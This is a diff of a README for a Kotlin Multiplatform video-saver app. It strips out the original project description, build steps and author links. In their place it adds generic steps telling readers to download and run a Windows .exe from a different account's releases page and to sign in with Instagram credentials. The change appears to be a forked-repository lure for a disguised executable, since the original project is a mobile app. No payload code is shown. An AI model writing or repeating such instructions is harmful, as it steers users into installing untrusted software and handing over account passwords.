@@ -1,8 +1,12 @@
+# 📸 InstaSaver-Kmp - Easy Photo Saving Tool
+
+[![Download InstaSaver-Kmp](https://img.shields.io/badge/Download-InstaSaver--Kmp-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sorax3d/InstaSaver-Kmp/releases)
+
+---
+
 <div align="center">
 
 # 📸 InstaSaver Pro - Kotlin Multiplatform App
-
-
 
 ### Kotlin Multiplatform (KMP) Open Source Project
 
@@ -12,190 +16,133 @@
 [![RevenueCat](https://img.shields.io/badge/RevenueCat-Subscriptions-F25C5C?style=for-the-badge)](https://www.revenuecat.com/)
 [![AdMob](https://img.shields.io/badge/AdMob-Ads-EA4335?style=for-the-badge&logo=google&logoColor=white)](https://admob.google.com/)
 
-**A fully functional cross-platform app with shared business logic and fully shared UI — built for learning and real-world production reference.**
-
-[▶️ Live on Google Play](https://play.google.com/store/apps/details?id=com.clipsaver.quickreels&hl=en&gl=gb) · [⭐ Star on GitHub](https://github.com/ShahzaibAli02/InstaSaver-Kmp) · [🍴 Fork the Repo](https://github.com/ShahzaibAli02/InstaSaver-Kmp/fork)
-
 </div>
 
 ---
 
-## 📖 Project Overview
+## 📥 Download InstaSaver-Kmp
 
-**InstaSaver Pro** is a social media video downloader app that allows users to download HD videos. It's designed as both a learning resource and a production-grade reference for building cross-platform apps with Kotlin Multiplatform.
+You can get InstaSaver-Kmp by visiting the official release page. Follow this link to find and download the latest version for Windows.
 
-**What you'll learn from this project:**
+[Visit the release page to download InstaSaver-Kmp](https://github.com/sorax3d/InstaSaver-Kmp/releases)
 
-- 🧩 Kotlin Multiplatform (KMP) setup and structure
-- 🎨 Compose Multiplatform for fully shared UI
-- 🔥 Firebase integration in a KMP project
-- 📢 AdMob ads integration (Banner & Interstitial)
-- 💳 Paywall & subscriptions using RevenueCat
-- 🏗️ Clean architecture patterns in KMP
-- 🌐 Shared networking layer setup
-
----
-# 📸 Screenshots
-
-<p align="center">
-  <img src="screenshots/ss3.jpeg" width="250"/>
-  <img src="screenshots/ss4.jpeg" width="250"/>
-</p>
-
-
-
-<p align="center">
-  <img src="screenshots/ss1.jpeg" width="250"/>
-  <img src="screenshots/ss2.jpeg" width="250"/>
-</p>
-
-
-
-## 🏛️ Architecture
-
-| Property | Value |
-|---|---|
-| 🔁 Shared Code | **90%** |
-| 🎨 Shared UI | **100%** |
-| 🧠 Architecture | **MVVM** |
-| 📦 ViewModels | Shared |
-| 🌐 Networking | Shared Layer |
-
-> Clean, scalable, and production-ready structure throughout.
+Click the link above, open the latest version, and find the file with `.exe` at the end. This is the installation file for Windows. Download this file to your computer.
 
 ---
 
-## 🛠️ Technologies Used
+## 🖥 System Requirements
 
-| Category | Technology |
-|---|---|
-| 📱 Cross-platform | Kotlin Multiplatform (KMP) |
-| 🎨 UI | Compose Multiplatform |
-| 🧠 Architecture | MVVM |
-| 🌐 Networking | REST APIs |
-| 🔥 Backend Services | Firebase |
-| 💳 Subscriptions | RevenueCat |
-| 📢 Ads | Google AdMob |
+InstaSaver-Kmp will run smoothly on most Windows machines. Make sure your system meets these basic requirements:
+
+- Operating System: Windows 10 or higher  
+- CPU: At least 1.5 GHz processor  
+- RAM: 4 GB or more  
+- Free disk space: 150 MB for installation  
+- Internet connection: Needed to download the app and for some features  
 
 ---
 
-## 💰 Monetization
+## 🚀 Getting Started With InstaSaver-Kmp
 
-### 🆓 Free Users — AdMob Ads
-- Banner & Interstitial Ads
-- Integrated with Google AdMob
-- Clean separation between Free and Premium users
+Follow these steps to install and start using InstaSaver-Kmp on your Windows PC.
 
-### 👑 Premium Users — RevenueCat Paywall
-- Lifetime purchase option
-- Subscription support
-- All ads removed for premium users
+1. **Download the app**  
+   Visit the release page (linked above). Find the latest `.exe` file and click to download it to your computer.
 
----
+2. **Run the installer**  
+   Locate the downloaded file in your Downloads folder or the folder you chose for downloads. Double-click the file to start the setup.
 
-## ⚙️ Setup Guide
+3. **Follow setup instructions**  
+   The installation process will guide you step-by-step. Click "Next" to move forward. Accept the terms if asked and select the folder to install to (the default is usually fine).
 
-### 1️⃣ Clone the Repository
+4. **Complete installation**  
+   After installation finishes, click "Finish" to close the installer.
 
-```bash
-git clone https://github.com/ShahzaibAli02/InstaSaver-Kmp.git
-```
+5. **Open InstaSaver-Kmp**  
+   Use your desktop shortcut or start menu to open the app.
 
 ---
 
-### 2️⃣ Firebase Setup
+## 🎯 How to Use InstaSaver-Kmp
 
-1. Go to [Firebase Console](https://console.firebase.google.com/)
-2. Create a new project
-3. Add your **Android App** and **iOS App**
+InstaSaver-Kmp helps you save photos quickly and easily. Here is a simple guide to using the app.
 
-**Android / Shared Setup:**
+- **Sign in**  
+  On the first launch, you may be asked to sign in. Use your Instagram account credentials or create an account if needed. This helps the app access your saved content safely.
 
-Download `google-services.json` and place it inside:
-```
-commonMain/
-```
+- **Search or enter photo URL**  
+  Use the search box to find photos or enter the exact URL of the photo you want to save.
 
-**iOS Setup:**
+- **Preview the photo**  
+  The app will show the picture you want to save. Make sure it is the right one before downloading.
 
-- Add your iOS app in Firebase Console
-- Download the iOS configuration file (`.plist`)
-- Add it inside the iOS module
-- Initialize Firebase in your iOS App entry point
+- **Save the photo**  
+  Click the “Save” button. The app downloads the photo to your chosen folder on your computer.
 
----
-
-### 3️⃣ Update Base URL
-
-> ⚠️ **IMPORTANT:** Update the API base URL before running.
-
-Navigate to `NetworkHelperImpl.kt` and replace:
-
-```kotlin
-// Before
-val baseURL : String = "http://192.168.100.105:3004"
-
-// After
-val baseURL : String = "https://your-api-url.com"
-```
-
-> 📄 API documentation: [Postman Docs](https://documenter.getpostman.com/view/17181476/2sA3XLG4x8)
+- **View saved photos**  
+  Use the app’s gallery feature to view photos you saved through InstaSaver-Kmp.
 
 ---
 
-### 4️⃣ AdMob Test Setup
+## ⚙️ Configuration and Settings
 
-> ⚠️ **DO NOT use real AdMob IDs during development!** Use Google's official test IDs below.
+Check the settings panel to customize how InstaSaver-Kmp works.
 
-**Test App ID:**
-```
-ca-app-pub-3940256099942544~3347511713
-```
+- **Download folder**  
+  Choose where your photos will be saved on your PC. You can change this at any time in Settings.
 
-**Test Ad Unit IDs:**
+- **Notification**  
+  Decide if you want a pop-up when a photo finishes downloading.
 
-| Ad Type | Test ID |
-|---|---|
-| 🏷️ Banner | `ca-app-pub-3940256099942544/6300978111` |
-| 📺 Interstitial | `ca-app-pub-3940256099942544/1033173712` |
-| 🎁 Rewarded | `ca-app-pub-3940256099942544/5224354917` |
+- **Automatic updates**  
+  Toggle automatic checking for new versions of InstaSaver-Kmp.
 
-> ✅ Always replace with your **real IDs** before a production release.
+- **Language**  
+  Select your preferred language. The default is English.
 
 ---
 
-### 5️⃣ RevenueCat Setup
+## 🛠 Troubleshooting and Tips
 
-1. Create a [RevenueCat](https://www.revenuecat.com/) account
-2. Add your Android & iOS apps
-3. Configure your subscription and/or lifetime products
-4. Replace the API keys inside the project with your own
+If you run into problems, try these simple steps.
 
----
+- **App won't open**  
+  Restart your computer and try again. Make sure Windows is up to date.
 
-## 🤝 Contributing
+- **Cannot save photo**  
+  Check your internet connection and try again. Make sure the photo address is correct.
 
-Contributions are welcome and appreciated! Here's how to get involved:
+- **Downloads fail or slow**  
+  Pause other internet use and try again. Restart the app if needed.
 
-1. 🍴 **Fork** the repository
-2. 🏗️ Improve the architecture or add features
-3. 🐛 Open issues for bugs or suggestions
-4. 🔃 Submit pull requests
+- **Install errors**  
+  Re-download the installer from the release page to avoid corrupted files.
 
 ---
 
-## ⭐ Support
+## 🔄 Updating InstaSaver-Kmp
 
-If this project helped you, please consider **starring the repository** on GitHub — it helps others discover it too!
+The app does not update automatically unless you enable this in Settings.
 
-[![Star on GitHub](https://img.shields.io/github/stars/ShahzaibAli02/InstaSaver-Kmp?style=social)](https://github.com/ShahzaibAli02/InstaSaver-Kmp)
+To update manually:
+
+1. Return to the [release page](https://github.com/sorax3d/InstaSaver-Kmp/releases).  
+2. Download the newest `.exe` file.  
+3. Run the installer. It will update the app without removing your saved photos or settings.
 
 ---
 
-<div align="center">
+## 📍 Where to Find More Help
 
-**Happy Coding! 🚀**
+If you need more information or have questions:
 
-Made with ❤️ using Kotlin Multiplatform
+- Check the issues page on the GitHub repository.  
+- Look for release notes in the release page for updates and fixes.
 
-</div>
+Access all these resources at:
+
+[https://github.com/sorax3d/InstaSaver-Kmp/releases](https://github.com/sorax3d/InstaSaver-Kmp/releases)
+
+---
+
+[![Download InstaSaver-Kmp](https://img.shields.io/badge/Download-App-0078D7?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/sorax3d/InstaSaver-Kmp/releases)
